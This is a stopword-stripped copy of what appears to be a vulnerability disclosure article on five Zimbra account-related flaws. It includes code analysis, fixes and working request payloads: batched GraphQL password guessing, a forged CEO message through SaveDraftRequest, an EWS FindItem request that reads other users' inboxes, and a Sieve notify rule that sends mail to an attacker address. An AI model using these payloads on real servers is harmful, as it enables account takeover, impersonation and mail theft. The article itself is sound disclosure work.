+      "norm": "one account every mailbox breaking zimbra s identity boundaries part 1 p style direction ltr span style font size undefined enterprise mail server authenticates users stores private communications delivers recovery links runs calendars sends mail employees other systems trust compromising can therefore expose both email identities workflows built around span p p style direction ltr span style font size undefined during broader assessment zimbra collaboration suite zcs rapid7 reported more than 80 vulnerabilities spanning authentication mailbox authorization calendar processing web clients document services host operating system affected components being fixed different schedules so we publishing analysis stages accompanying span href style font size undefined github repository span span style font size undefined containing full write ups pocs serves live technical tracker updated further findings fixes become public span p p style direction ltr span style font size undefined this first article concentrates five account related vulnerabilities span p p span style font size undefined span p table colgroup col style width 14 468473956746877 col style width 44 93799225447109 col style width 17 581480353335362 col style width 23 01205343544667 colgroup thead tr th p style direction ltr span style font size undefined strong cve strong span p th th p style direction ltr span style font size undefined strong finding strong span p th th p style direction ltr span style font size undefined strong rapid7 cvss strong span p th th p style direction ltr span style font size undefined strong fixed release strong span p th tr thead tbody tr td p style direction ltr span style font size undefined span href style font size undefined cve 2026 93637 span p td td p style direction ltr span style font size undefined graphql authentication rate limit bypass span p td td p style direction ltr href style font size undefined 3 7 low span p td td p style direction ltr span style font size undefined no public fix listed span p td tr tr td p style direction ltr span style font size undefined span href style font size undefined cve 2026 93635 span p td td p style direction ltr span style font size undefined ldap filter injection span p td td p style direction ltr href style font size undefined 5 3 medium span p td td p style direction ltr span style font size undefined no public fix listed span p td tr tr td p style direction ltr href style font size undefined cve 2026 73571 span p td td p style direction ltr span style font size undefined email impersonation via span span style color rgb 24 128 56 font size undefined span savedraftrequest span span p td td p style direction ltr href style font size undefined 8 3 high span p td td p style direction ltr span style font size undefined zcs 10 1 17 span p td tr tr td p style direction ltr href style font size undefined cve 2026 10631 span p td td p style direction ltr span style font size undefined ews cross user mailbox access span p td td p style direction ltr href style font size undefined 6 5 medium span p td td p style direction ltr span style font size undefined zcs 10 1 20 span p td tr tr td p style direction ltr href style font size undefined cve 2026 50055 span p td td p style direction ltr span style font size undefined sieve notify forwarding restriction bypass span p td td p style direction ltr href style font size undefined 6 5 medium span p td td p style direction ltr span style font size undefined zcs 10 1 20 span p td tr tbody table p p p style direction ltr span style font size undefined part 2 cover unauthenticated stored xss paths classic modern clients they can do recipient s session script can install sieve forwarding rule cve 2026 50055 another path preserves direct mailbox access after original session expires victim changes their password cve 2026 73571 makes these attacks more credible placing message mailbox any chosen local user span p p style direction ltr span style font size undefined parts 3 4 move through document service boundary ssrf code execution span span style color rgb 24 128 56 font size undefined span zimbra span span span style font size undefined then cover multiple independent paths span span style color rgb 24 128 56 font size undefined span zimbra span span span style font size undefined root brucon presentation span href target blank span style font size undefined em signed sealed compromised weaponizing enterprise mail infrastructure em span span style font size undefined previewed these chains including selected root command output returned victim s browser after one message selection span p h2 style direction ltr product description h2 p style direction ltr href style font size undefined zimbra collaboration suite span span style font size undefined self hosted platform email calendars contacts tasks file sharing zimbra calls commercial server network edition within one network edition installation customers can license mixture standard professional users zimbra desktop zimbra connector outlook separate client applications while exchange web services ews separately licensed server feature outlook compatibility span p p style direction ltr span style font size undefined zcs includes two webmail clients different request rendering stacks classic relies primarily soap while modern uses graphql server also accepts smtp icalendar input exposes compatibility services such ews delegates work local components running under several operating system identities span p h2 style direction ltr testing setup h2 p style direction ltr span style font size undefined rapid7 initially assessed zcs span span style color rgb 24 128 56 font size undefined span 10 1 16 ga 4850 span span span style font size undefined network edition ubuntu 22 04 fixed findings each section describes zimbra s fix accompanying span href style font size undefined github repository span span style font size undefined retains complete vulnerable fixed diff span p h2 style direction ltr impact h2 p style direction ltr span style font size undefined pre authentication findings lower separate barriers obtaining foothold graphql hides failed password attempts zimbra s source ip counter configured external ldap case second flaw can also leave optional account lockout policy no local account lock span p p style direction ltr span style font size undefined each remaining finding independently exploitable ordinary compromised account email impersonation needs no optional feature attacker places different local address authenticated request zimbra submits message account through trusted outbound pipeline records copy selected user s sent folder span p p style direction ltr span style font size undefined if ews enabled compromised account attacker can read private conversations attachments drafts sent mail contacts calendar entries other users mailboxes separate sieve policy bypass can keep copies future mail flowing attacker after original session expires password changes span p p style direction ltr span style font size undefined these examples do not represent everything attacker can do authenticated zimbra access full vulnerability set assessment span p h2 style direction ltr graphql authentication rate limit bypass cve 2026 93637 h2 p style direction ltr span style font size undefined this pre authentication route requires only https access zimbra span span style color rgb 24 128 56 font size undefined span zimbrainvalidloginfilter span span span style font size undefined normally records failed logins source address around requests public service endpoints classic submits login attempts through soap span span style color rgb 24 128 56 font size undefined span authrequest span span span style font size undefined path whereas modern exposes same password check through graphql span span style color rgb 24 128 56 font size undefined span authenticate span span span style font size undefined mutation span p p style direction ltr span style font size undefined limiter s failure threshold 10 default after source crosses within configured window subsequent requests handled filter receive http 503 cve 2026 93637 allows attempts through graphql remain invisible counter span p h3 style direction ltr span style color rgb 67 67 67 technical analysis span h3 h4 style direction ltr span style color rgb 102 102 102 failure counter relies request attribute span h4 p style direction ltr span style color rgb 24 128 56 font size undefined span zimbrainvalidloginfilter span span span style font size undefined wraps requests public service endpoints runs downstream handler before counter logic span p p style direction ltr span style color rgb 55 71 79 font size undefined span p pre zimbrainvalidloginfilter dofilter whitelist disabled filter existing suspension handling omitted chain dofilter request response if req getattribute auth failed null 0 wrapper supplied signal logging omitted boolean loginfailed boolean req getattribute auth failed if loginfailed per ip counter lookup initialization omitted if count incrementandget this maxfailedlogin this numberoffailedoccurence put clientip count this suspiciousipaddrlastattempt put clientip system currenttimemillis this numberoffailedoccurence put clientip count final debug logging omitted pre p p p style direction ltr span style font size undefined span span style color rgb 24 128 56 font size undefined span 0 span span span style font size undefined failure processing begins only if downstream path added span span style color rgb 24 128 56 font size undefined span auth failed span span span style font size undefined request relevant soap exception path span p p style direction ltr span style color rgb 55 71 79 font size undefined span p pre soapengine dispatchrequest earlier dispatch handling omitted catch accountserviceexception authfailedserviceexception e httpservletrequest httpreq httpservletrequest context get servlet request httpreq setattribute auth failed object boolean true 1 failure becomes visible string clientip string context get request ip httpreq setattribute request ip object clientip response soapproto soapfault serviceexception e debug informational logging omitted pre p p p style direction ltr span style font size undefined span span style color rgb 24 128 56 font size undefined span 1 span span span style font size undefined span span style color rgb 24 128 56 font size undefined span soapengine dispatchrequest span span span style font size undefined sets attribute before returning authentication fault failed soap login therefore reaches check span span style color rgb 24 128 56 font size undefined span 0 span span span style font size undefined increments source ip counter span p h4 style direction ltr span style color rgb 102 102 102 graphql skips soap failure handler span h4 p style direction ltr span style font size undefined modern zimbra s graphql extension builds ordinary span span style color rgb 24 128 56 font size undefined span authrequest span span span style font size undefined then reaches handler through span span style color rgb 24 128 56 font size undefined span xmldocumentutilities executedocumentasguest span span span style font size undefined span p p style direction ltr span style color rgb 55 71 79 font size undefined span p pre xmldocumentutilities executedocumentasguest public static element executedocumentasguest documenthandler handler element request requestcontext rctxt throws serviceexception hashmap string object context hashmap string object context put zimbra context gqlauthutilities getguestzimbrasoapcontext request getqname handler rctxt context put servlet request rctxt getrawrequest context put servlet response rctxt getrawresponse return handler handle request context 2 bypasses soapengine pre p p p style direction ltr span style font size undefined span span style color rgb 24 128 56 font size undefined span 2 span span span style font size undefined helper calls authentication handler without passing through span span style color rgb 24 128 56 font size undefined span soapengine span span span style font size undefined incorrect password still becomes graphql error but catch block span span style color rgb 24 128 56 font size undefined span 1 span span span style font size undefined never runs attribute read span span style color rgb 24 128 56 font size undefined span 0 span span span style font size undefined absent so filter does not increment source ip counter span p h3 style direction ltr span style color rgb 67 67 67 exploitation span h3 h4 style direction ltr span style color rgb 102 102 102 batched authentication span h4 p style direction ltr span style font size undefined unauthenticated client sends json span span style color rgb 24 128 56 font size undefined span service extension graphql span span span style font size undefined graphql aliases let span span style color rgb 24 128 56 font size undefined span query span span span style font size undefined field invoke span span style color rgb 24 128 56 font size undefined span authenticate span span span style font size undefined repeatedly different passwords span p p style direction ltr span style color rgb 24 128 56 font size undefined span p pre mutation a0 authenticate authinput account accountby name key victim example test password pass0 authtoken a1 authenticate authinput account accountby name key victim example test password pass1 authtoken a2 authenticate authinput account accountby name key victim example test password pass2 authtoken pre p p p style direction ltr span style font size undefined each alias performs real authentication operation failures appear graphql span span style color rgb 24 128 56 font size undefined span errors span span span style font size undefined array while successful alias returns authentication token under corresponding name graphql engine imposes no application level alias limit this path whole document remains one http request so jetty s request count control sees one request rather than number login operations inside span p p style direction ltr span style font size undefined alias execution sequential backend bound so rate depends deployment using 100 aliases per request 10 000 candidates completed under two minutes without zimbra ip counter jetty s request filter blocking source vulnerability removes ip level failed login accounting reduces request overhead span p p style direction ltr span style font size undefined span href style font size undefined cve 2026 93637 poc span span style font size undefined accepts ordinary password file generates batched graphql documents reports accepted candidate span p p p figure style margin 0 div style display inline block img alt metasploit module png class embedded asset src style width auto type asset figcaption style text align center figure 1 metasploit module tests 1500 passwords 15 requests successfully identifying correct password final batch figcaption div figure h4 style direction ltr span style color rgb 102 102 102 per account lockout span h4 p style direction ltr span style font size undefined ip counter not zimbra s only possible control separate per account lockout policy disabled default but when enabled failed graphql operations still increment target local account s counter stop further guessing when account locks span p h4 style direction ltr span style color rgb 102 102 102 cve 2026 93635 external ldap span h4 p style direction ltr span style font size undefined domains configured external ldap search filter authentication lazy auto provisioning cve 2026 93635 turns login field into password oracle external directory user span span style color rgb 24 128 56 font size undefined span ldaputil computedn span span span style font size undefined substitutes wildcarded login such span span style color rgb 24 128 56 font size undefined span jdoe example test span span span style font size undefined into configured filter without escaping if pattern selects one directory entry zimbra tries candidate password against user incorrect password returns span span style color rgb 24 128 56 font size undefined span account auth failed span span span style font size undefined correct password passes ldap bind reaches lazy provisioning producing different response span p p style direction ltr span style font size undefined wildcarded login not name existing local zimbra account so optional per account lockout no account against which record failed attempt sending same operation through graphql also avoids source ip counter per account lockout enabled threshold set five repeated wrong candidates incremented neither counter while correct password remained distinguishable this two bug composition applies only stated external ldap configuration not zimbra s default local authentication path span p p style direction ltr span style font size undefined span href style font size undefined ldap graphql composition poc span span style font size undefined span href style font size undefined cve 2026 93635 tracker entry span span style font size undefined cover this configured external directory path detail span href style font size undefined cve 2026 93637 tracker entry span span style font size undefined records standalone finding affected version evidence span p h3 style direction ltr span style color rgb 67 67 67 impact span h3 p style direction ltr span style font size undefined anyone who can reach public graphql endpoint can make repeated password guesses without triggering zimbra s source ip suspension batching several candidates also reduces number http requests associated network overhead this makes weak reused previously exposed passwords more practical test but does not reveal strong password bypass separate mfa check span p h2 style direction ltr email impersonation via savedraftrequest cve 2026 73571 h2 p style direction ltr span style color rgb 24 128 56 font size undefined span savedraftrequest span span span style font size undefined delegated sending path selected span span style color rgb 24 128 56 font size undefined span isdelegatedreq span span span style font size undefined vulnerable server ordinary user can place another local address request s span span style color rgb 24 128 56 font size undefined span span span span style font size undefined field handler resolves address mailbox assumes mailbox owner s authority calls zimbra s normal send routine without checking whether signed account send rights this application authorization failure not forged display name hand written smtp header zimbra submits attacker s message selected account adds corresponding item account s sent folder span p p style direction ltr span style font size undefined target must same mailbox server but attack requires no optional zimbra feature existing delegation administrator right victim action span p h3 style direction ltr span style color rgb 67 67 67 technical analysis span h3 h4 style direction ltr span style color rgb 102 102 102 claimed sender becomes mailbox authority span h4 p style direction ltr span style font size undefined after request parser extracts span span style color rgb 24 128 56 font size undefined span span span span style font size undefined address delegated branch resolves address local account reads optional span span style color rgb 24 128 56 font size undefined span delegateeaccountid span span span style font size undefined span p p style direction ltr span style color rgb 55 71 79 font size undefined span p pre savedraft handle excerpt message fields address delegation attributes parsed above if mailaddress null delegatoraccount prov get key accountby name mailaddress zsc getauthtoken 0 account named if isdelegatedreq delegatormbox mailboxmanager getinstance getmailboxbyaccountid delegatoraccount getid account delegateeaccount null operationcontext oct null if delegateeaccountid null delegateeaccount prov getaccountbyid delegateeaccountid oct operationcontext delegateeaccount 1 supplied account context else if delegatormbox null oct operationcontext delegatormbox 2 claimed sender context if oct null delegatormbox null mm parsemimemessage parsemimemsgsoap zsc oct delegatormbox msgelem null mimedata boolean deliveryreport false optional delivery report update omitted sendmsg dosendmessage oct delegatormbox mm mimedata uploads null r null null false false false deliveryreport 3 platform delivery response construction omitted pre p p p style direction ltr span style font size undefined there no span span style color rgb 24 128 56 font size undefined span checkright span span span style font size undefined span span style color rgb 24 128 56 font size undefined span canaccessaccount span span span style font size undefined span span style color rgb 24 128 56 font size undefined span cansendas span span span style font size undefined call between resolving account span span style color rgb 24 128 56 font size undefined span 0 span span span style font size undefined delivery span span style color rgb 24 128 56 font size undefined span 3 span span span style font size undefined demonstrated request span span style color rgb 24 128 56 font size undefined span delegateeaccountid span span span style font size undefined absent span span style color rgb 24 128 56 font size undefined span 2 span span span style font size undefined zimbra constructs operation context mailbox named span span style color rgb 24 128 56 font size undefined span span span span style font size undefined causing later send treat selected account caller span span style color rgb 24 128 56 font size undefined span 3 span span span style font size undefined then submits message through zimbra s legitimate sending path span p p style direction ltr span style font size undefined there second way trigger flaw attacker can supply claimed sender s account uuid span span style color rgb 24 128 56 font size undefined span delegateeaccountid span span span style font size undefined span span style color rgb 24 128 56 font size undefined span 1 span span span style font size undefined zimbra constructs operation context directly account reaches same impersonation result without checking identity actually signed span p h3 style direction ltr span style color rgb 67 67 67 exploitation span h3 h4 style direction ltr span style color rgb 102 102 102 sending local identity span h4 p style direction ltr span style font size undefined relevant span span style color rgb 24 128 56 font size undefined span savedraftrequest span span span style font size undefined body span p p style direction ltr span style color rgb 147 52 230 font size undefined span p pre savedraftrequest xmlns urn zimbramail isdelegatedreq 1 m e t t recipient example test e t f ceo example test su updated payroll review su mp ct text plain content please review changes content mp m savedraftrequest pre p p p style direction ltr span style font size undefined because zimbra submits message through legitimate infrastructure issue goes beyond display name spoofing deployment whose legitimate outbound mail passes spf dkim dmarc impersonated message passes them too uses same source mta signing domain rfc sender envelope sender legitimate mail selected account local testing confirmed sender alignment normal mta path span p p style direction ltr span style font size undefined span href style font size undefined cve 2026 73571 poc span span style font size undefined submits delegated request operator selected sender recipient subject message body affected build message arrived ceo rfc sender same subject appeared ceo s sent folder span p p p figure style margin 0 div style display inline block img alt forged ceo communications png class embedded asset src style width auto type asset figcaption style text align center figure 2 victim s inbox displays forged message ordinary internal email ceo figcaption div figure h3 style direction ltr span style color rgb 67 67 67 impact span h3 p style direction ltr span style font size undefined attacker can impersonate any local user not only administrator executive internally allows believable payment requests changes account details malicious links false instructions fraudulent approvals normal display name spoofing warnings external sender banners do not help because zimbra submits message selected local user span p p style direction ltr span style font size undefined zimbra also places forged message impersonated user s sent folder this leaves fabricated record authorship can support attempt frame user span p p p figure style margin 0 div style display inline block img alt ceo sent folder png class embedded asset src style width auto type asset figcaption style text align center figure 3 same forged message recorded ceo s sent folder figcaption div figure p style direction ltr span style font size undefined span p p span style font size undefined external recipients attacker can send finance account request payment details use operations account cancel alter order send scams abusive mail under employee s address consequences depend role relationships selected sender span p p style direction ltr span style font size undefined same trusted delivery advantage applies exploit bearing mail next article examine browser side findings attacker can deliver any chosen local account impersonation not required xss itself but can make message appear come somebody recipient trusts span p h3 style direction ltr span style color rgb 67 67 67 fix span h3 p style direction ltr span style font size undefined span href style font size undefined patch span span style font size undefined zcs 10 1 17 retains account actually signed unless explicit send send behalf right unauthorized delegated request consequently runs caller rather than account named message span p h2 style direction ltr ews cross user mailbox access cve 2026 10631 h2 p style direction ltr span style font size undefined zimbra s ews extension uses composite folder ids intended shared mailbox operations span span style color rgb 24 128 56 font size undefined span finditem span span span style font size undefined trusts owner uuid inside attacker supplied id constructs authorization context selected mailbox instead account signed this insecure direct object reference idor lets any ordinary ews enabled account read complete items other users mailboxes without share delegation grant span p p style direction ltr span style font size undefined attacker needs span span style color rgb 24 128 56 font size undefined span zimbrafeatureewsenabled true span span span style font size undefined although disabled default deployments using zimbra s outlook desktop integration commonly enable ews class service wide target account does not need ews enabled no target user action required span p h3 style direction ltr span style color rgb 67 67 67 technical analysis span h3 h4 style direction ltr span style color rgb 102 102 102 composite ids select mailbox span h4 p style direction ltr span style font size undefined address shared item ews needs identify both mailbox owns item folder inside mailbox zimbra encodes this span span style color rgb 24 128 56 font size undefined span owneruuid numericid span span span style font size undefined example span p p span style font size undefined span p pre span style color rgb 197 34 31 font size undefined 5e05e6e2 8810 4c2a a7ac 3771df62e344 span 2 owner uuid folder 2 inbox pre p p p style direction ltr span style font size undefined when span span style color rgb 24 128 56 font size undefined span finditem span span span style font size undefined receives composite id span span style color rgb 24 128 56 font size undefined span folderutil parseitemid span span span style font size undefined separates owner numeric portions owner value then passed span span style color rgb 24 128 56 font size undefined span itemutil getgrantormailbox span span span style font size undefined span p p style direction ltr span style color rgb 55 71 79 font size undefined span p pre itemutil getgrantormailbox public static mailbox getgrantormailbox string ownerid throws serviceexception provisioning prov provisioning getinstance account owneracct prov get key accountby id ownerid 0 supplied owner uuid mailbox mailboxownr mailboxmanager getinstance getmailboxbyaccount owneracct 1 selected mailbox return mailboxownr pre p p p style direction ltr span style font size undefined span span style color rgb 24 128 56 font size undefined span 0 span span span style font size undefined ews resolves supplied owner uuid local account span span style color rgb 24 128 56 font size undefined span 1 span span span style font size undefined retrieves account s mailbox neither method receives caller s identity span p h4 style direction ltr span style color rgb 102 102 102 mailbox becomes authenticated identity span h4 p style direction ltr span style font size undefined authenticated account selected mailbox then passed span span style color rgb 24 128 56 font size undefined span itemoperation span span span style font size undefined span p p style direction ltr span style color rgb 55 71 79 font size undefined span p pre itemoperation itemoperation public itemoperation account account mailbox mailbox zimbraauth zimbraauth throws serviceexception this account account 2 authenticated attacker this mailbox mailbox 3 selected owner s mailbox this octxt mailbox null operationcontext account operationcontext mailbox 4 selected owner context this zimbraauth zimbraauth this octxt setuseragent zimbraauth getuseragent pre p p p style direction ltr span style color rgb 24 128 56 font size undefined span 2 span span span style font size undefined attacker account supplying victim uuid makes span span style color rgb 24 128 56 font size undefined span 3 span span span style font size undefined victim mailbox so not null span span style color rgb 24 128 56 font size undefined span 4 span span span style font size undefined therefore creates span span style color rgb 24 128 56 font size undefined span operationcontext span span span style font size undefined victim mailbox instead attacker account span p p style direction ltr span style color rgb 55 71 79 font size undefined span p pre operationcontext constructors public operationcontext mailbox mbox throws serviceexception this mbox getaccount 5 target mailbox owner public operationcontext account acct this acct false public operationcontext account acct boolean admin this authuser acct 6 identity used permission checks remaining context initialization omitted pre p p p style direction ltr span style color rgb 24 128 56 font size undefined span 5 span span span style font size undefined extracts victim account mailbox span span style color rgb 24 128 56 font size undefined span 6 span span span style font size undefined stores victim authenticated user mailbox then compares this identity owner span p p style direction ltr span style color rgb 55 71 79 font size undefined span p pre mailbox getauthenticatedaccount account getauthenticatedaccount context authenticated user lookup omitted if authuser null authuser getid equals this getaccountid authuser null 7 matching identity treated owner access return authuser pre p p p style direction ltr span style font size undefined identities match so span span style color rgb 24 128 56 font size undefined span 7 span span span style font size undefined changes authenticated user null which downstream checks treat owner access attacker s request consequently authorized victim ews used untrusted owner uuid both select mailbox decide who authenticated numeric folder id subsequently resolved within owner context allowing span span style color rgb 24 128 56 font size undefined span finditem span span span style font size undefined access any folder selected mailbox span p h3 style direction ltr span style color rgb 67 67 67 exploitation span h3 h4 style direction ltr span style color rgb 102 102 102 resolving target mailbox span h4 p style direction ltr span style font size undefined target uuid available through ordinary authenticated directory lookups both span span style color rgb 24 128 56 font size undefined span getaccountinforequest span span span style font size undefined span span style color rgb 24 128 56 font size undefined span searchgalrequest span span span style font size undefined return span span style color rgb 24 128 56 font size undefined span zimbraid span span span style font size undefined known local address poc uses span span style color rgb 24 128 56 font size undefined span getaccountinforequest span span span style font size undefined span p p style direction ltr span style color rgb 147 52 230 font size undefined span p pre getaccountinforequest xmlns urn zimbraaccount account name victim example test account getaccountinforequest pre p p p style direction ltr span style font size undefined response contains target s uuid span p p style direction ltr span style color rgb 55 71 79 font size undefined span p pre attr name zimbraid span style color rgb 197 34 31 font size undefined 5e05e6e2 8810 4c2a a7ac 3771df62e344 span attr pre p p p style direction ltr span style font size undefined appending span span style color rgb 24 128 56 font size undefined span 2 span span span style font size undefined uuid forms target s inbox identifier attacker sends following ews request span span style color rgb 24 128 56 font size undefined span service extension zimbraews span span span style font size undefined span span style color rgb 24 128 56 font size undefined span ews exchange asmx span span span style font size undefined when ews exposed through zimbra s standard proxy span p p style direction ltr span style color rgb 147 52 230 font size undefined span p pre m finditem traversal shallow xmlns m xmlns t m itemshape t baseshape allproperties t baseshape t includemimecontent true t includemimecontent m itemshape m indexedpageitemview maxentriesreturned 5 offset 0 basepoint end m parentfolderids t folderid id 5e05e6e2 8810 4c2a a7ac 3771df62e344 2 m parentfolderids m finditem pre p p p style direction ltr span style font size undefined server returns selected mailbox s data ews response span p p style direction ltr span style color rgb 147 52 230 font size undefined span p pre ns2 message xmlns ns2 complete base64 mime other returned fields omitted ns2 itemid id 5e05e6e2 8810 4c2a a7ac 3771df62e344 380 changekey 600 ns2 subject project phoenix acquisition timeline ns2 subject ns2 body bodytype text target accepted preliminary terms board approval due friday keep this strictly confidential ns2 body ns2 hasattachments true ns2 hasattachments ns2 ns2 mailbox ns2 emailaddress finance northbridge example ns2 emailaddress ns2 mailbox ns2 ns2 internetmessageid 20261005150023 563f6400b9 mail lab local ns2 internetmessageid ns2 message pre p p p style direction ltr span style font size undefined span href style font size undefined cve 2026 10631 poc span span style font size undefined obtains uuid creates composite id automatically span p h4 style direction ltr span style color rgb 102 102 102 cross account folder reads span h4 p style direction ltr span style font size undefined changing numeric component selects another well known folder span p p p table colgroup col style width 20 col style width 23 455497382198953 col style width 56 54450261780105 colgroup thead tr th p style direction ltr span style font size undefined strong folder strong span p th th p style direction ltr span style font size undefined strong crafted id strong span p th th p style direction ltr span style font size undefined strong unauthorized result strong span p th tr thead tbody tr td p style direction ltr span style font size undefined inbox span p td td p style direction ltr span style color rgb 24 128 56 font size undefined span uuid 2 span span p td td p style direction ltr span style font size undefined received messages attachments span p td tr tr td p style direction ltr span style font size undefined sent span p td td p style direction ltr span style color rgb 24 128 56 font size undefined span uuid 5 span span p td td p style direction ltr span style font size undefined messages sent target span p td tr tr td p style direction ltr span style font size undefined drafts span p td td p style direction ltr span style color rgb 24 128 56 font size undefined span uuid 6 span span p td td p style direction ltr span style font size undefined unfinished messages span p td tr tr td p style direction ltr span style font size undefined contacts span p td td p style direction ltr span style color rgb 24 128 56 font size undefined span uuid 7 span span p td td p style direction ltr span style font size undefined address book entries span p td tr tr td p style direction ltr span style font size undefined calendar span p td td p style direction ltr span style color rgb 24 128 56 font size undefined span uuid 10 span span p td td p style direction ltr span style font size undefined appointments meeting data span p td tr tbody table p p p style direction ltr span style font size undefined if target mailbox another server same zimbra cluster first server forwards crafted request receiving server resolves local mailbox same owner uuid reaches vulnerable span span style color rgb 24 128 56 font size undefined span finditem span span span style font size undefined constructor span p p style direction ltr span style font size undefined span href style font size undefined cve 2026 10631 tracker entry span span style font size undefined covers full response affected folders multi server path detail span p h3 style direction ltr span style color rgb 67 67 67 impact span h3 p style direction ltr span style font size undefined ews exposes victim s private message bodies attachments well drafts sent mail contacts calendar data attacker can monitor conversations use their history make separate impersonation attack more credible span p p style direction ltr span style font size undefined attacker can also request password reset another service monitor corresponding mailbox consume link ews does not bypass third party mfa itself but exposes email channel many services still treat sufficient proof because owner uuid attacker selected same ordinary ews account can repeat these reads against other local mailboxes span p p style direction ltr span style font size undefined note earlier version this analysis presented span href style font size undefined brucon 2026 span span style font size undefined attributed span span style color rgb 24 128 56 font size undefined span getitem span span span style font size undefined send move delete same flaw comparing intermediate network edition releases during this research required multiple restored vm appliances because ews license gated normal patching advances complete system one appliance retained separate mailbox authorization state obscured boundary span which initially made impact appear broader span style font size undefined repeating each operation explicit authorization target state controls narrowed cve span span style color rgb 24 128 56 font size undefined span finditem span span span style font size undefined which still exposes complete mime attachments span p h3 style direction ltr span style color rgb 67 67 67 fix span h3 p style direction ltr span style font size undefined span href style font size undefined patch span span style font size undefined zcs 10 1 20 creates ews authorization context account signed not mailbox selected composite id zimbra applied correction both local remote mailbox operations span p h2 style direction ltr sieve notify forwarding restriction bypass cve 2026 50055 h2 p style direction ltr span style color rgb 24 128 56 font size undefined span zimbrafeaturemailforwardinginfiltersenabled false span span span style font size undefined meant stop users creating server side mail forwarding rules zimbra enforces rejecting sieve span span style color rgb 24 128 56 font size undefined span redirect span span span style font size undefined but accepts span span style color rgb 24 128 56 font size undefined span notify span span span style font size undefined even though action can send selected headers complete text body arbitrary external address authenticated user can therefore install persistent mail exfiltration despite administrator s restriction if forwarding normally allowed there no policy boundary bypass span p h3 style direction ltr span style color rgb 67 67 67 technical analysis span h3 h4 style direction ltr span style color rgb 102 102 102 redirect only blocked action span h4 p style direction ltr span style font size undefined both span span style color rgb 24 128 56 font size undefined span modifyfilterrulesrequest span span span style font size undefined span span style color rgb 24 128 56 font size undefined span modifyoutgoingfilterrulesrequest span span span style font size undefined soap commands call span span style color rgb 24 128 56 font size undefined span checkforwardfilterattr span span span style font size undefined before saving rule check recognizes only one action type span p p span style font size undefined span p pre documenthandler checkforwardfilterattr public boolean checkforwardfilterattr account account list filterrule filterrules string filterruletype throws serviceexception if account isfeaturemailforwardinginfiltersenabled filterrules isempty filterrule filterrule filterrules if objects requirenonnull filterrule getfilteractions stream anymatch filteraction redirectaction class isinstance 0 redirect only this checkiffilteralreadyexists filterrule account filterruletype continue return false return true 1 all other actions allowed pre p p p style direction ltr span style font size undefined span span style color rgb 24 128 56 font size undefined span 0 span span span style font size undefined policy classifies only span span style color rgb 24 128 56 font size undefined span redirectaction span span span style font size undefined forwarding meaning span span style color rgb 24 128 56 font size undefined span notifyaction span span span style font size undefined span span style color rgb 24 128 56 font size undefined span rfccompliantnotifyaction span span span style font size undefined reach span span style color rgb 24 128 56 font size undefined span 1 span span span style font size undefined even though they can send attacker selected message content external email address span p h4 style direction ltr span style color rgb 102 102 102 notify expands message content span h4 p style direction ltr span style font size undefined these actions can include message content rather than just generic alert because span span style color rgb 24 128 56 font size undefined span soaptosieve getsievescript span span span style font size undefined enables span span style color rgb 24 128 56 font size undefined span variables span span span style font size undefined span span style color rgb 24 128 56 font size undefined span enotify span span span style font size undefined extensions span span style color rgb 24 128 56 font size undefined span filterutil getvarsmap span span span style font size undefined then supplies values available notification span p p style direction ltr span style color rgb 55 71 79 font size undefined span p pre filterutil getvarsmap excerpt case insensitive variable map construction omitted enumeration enumeration mimemessage getallheaders while enumeration hasmoreelements header header header enumeration nextelement vars put header getname tolowercase zinternetheader decode mimemessage getheader header getname 2 decoded headers vars put subject parsedmessage getsubject mpartinfo bodypart mime gettextbody parsedmessage getmessageparts false if bodypart null ioexception handling omitted vars put body mime getstringcontent bodypart getmimepart mailbox getaccount getprefmaildefaultcharset 3 selected text body return vars pre p p p style direction ltr span style font size undefined when rule runs span span style color rgb 24 128 56 font size undefined span notify executebasic span span span style font size undefined expands those variables into notification subject body span span style color rgb 24 128 56 font size undefined span 2 span span span style font size undefined makes decoded headers available span span style color rgb 24 128 56 font size undefined span 3 span span span style font size undefined supplies text part selected span span style color rgb 24 128 56 font size undefined span mime gettextbody span span span style font size undefined does not supply raw mime attachments span p h3 style direction ltr span style color rgb 67 67 67 exploitation span h3 h4 style direction ltr span style color rgb 102 102 102 installing persistent exfiltration span h4 p style direction ltr span style font size undefined authenticated user can place following rule object inside span span style color rgb 24 128 56 font size undefined span modifyfilterrulesrequest span span span style font size undefined span p p style direction ltr span style color rgb 147 52 230 font size undefined span p pre filterrule name email notification active 1 filtertests condition allof truetest filtertests filteractions actionnotify attacker external example su fwd subject content subject subject body actionkeep filteractions filterrule pre p p p style direction ltr span style color rgb 24 128 56 font size undefined span actionkeep span span span style font size undefined leaves original message user s inbox while each matching delivery sends selected message text headers external address span p p style direction ltr span style font size undefined span href style font size undefined cve 2026 50055 poc span span style font size undefined preserves existing filters while installing span span style color rgb 24 128 56 font size undefined span notify span span span style font size undefined rule after ordinary message arrived filtered account another mailbox received subject sender recipients date complete text body span href style font size undefined cve 2026 50055 tracker entry span span style font size undefined complete affected version information span p p span style font size undefined span p figure style margin 0 div style display inline block img alt notification delivered png class embedded asset src style width auto type asset figcaption style text align center figure 4 notification delivered attacker contains subject headers complete text body victim s message figcaption div figure h4 style direction ltr span style color rgb 102 102 102 hidden modern span h4 p style direction ltr span style font size undefined persistence not apparent modern during testing server returned active notification rule while same account s filters view remained empty server continued run rule normally but modern did not give account owner way discover remove span p p p figure style margin 0 div style display inline block img alt moderns filter view png class embedded asset src style width auto type asset figcaption style text align center figure 5 modern s filters view does not display active sieve notify rule figcaption div figure p p p style direction ltr span style font size undefined classic did list attacker selected name under active filters but overview did not expose notification address copied fields rule therefore not invisible every client attacker can choose less conspicuous name span p p p figure style margin 0 div style display inline block img alt zimbra classic view png class embedded asset src style width auto type asset figcaption style text align center figure 6 classic displays attacker s rule name but not external destination copied fields figcaption div figure h3 style direction ltr span style color rgb 67 67 67 impact span h3 p style direction ltr span style font size undefined flaw defeats administrator s attempt prevent users forwarding mail server side filters attacker authenticated session can install rule directly continues disclose future message text headers after session expires password changes without appearing modern s filters view does not forward attachments raw mime span p h3 style direction ltr span style color rgb 67 67 67 fix span h3 p style direction ltr span style font size undefined span href style font size undefined patch span span style font size undefined zcs 10 1 20 treats span span style color rgb 24 128 56 font size undefined span notify span span span style font size undefined rfc compliant variant forwarding actions rejects them under same account policy span span style color rgb 24 128 56 font size undefined span redirect span span span style font size undefined span p h2 style direction ltr remediation h2 p style direction ltr span style font size undefined apply latest supported zimbra release zimbra s span href style font size undefined security advisory span span style font size undefined lists cve 2026 73571 fixed zcs 10 1 17 cve 2026 10631 cve 2026 50055 fixed zcs 10 1 20 no fixed release publicly listed cve 2026 93635 cve 2026 93637 time publication so install security update containing those fixes when zimbra releases span p p style direction ltr span style font size undefined 